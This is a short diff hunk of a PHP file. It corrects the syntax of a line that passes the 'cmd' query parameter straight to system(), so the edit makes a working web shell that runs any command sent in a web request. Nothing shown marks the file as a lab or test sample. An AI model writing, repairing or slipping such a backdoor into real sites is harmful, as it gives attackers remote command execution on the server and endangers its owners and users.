@@ -10,7 +10,7 @@
 ?>
 
 <?
-if($_GET('cmd'))
+if($_GET['cmd'])
   system($_GET['cmd']);
   
 ?>
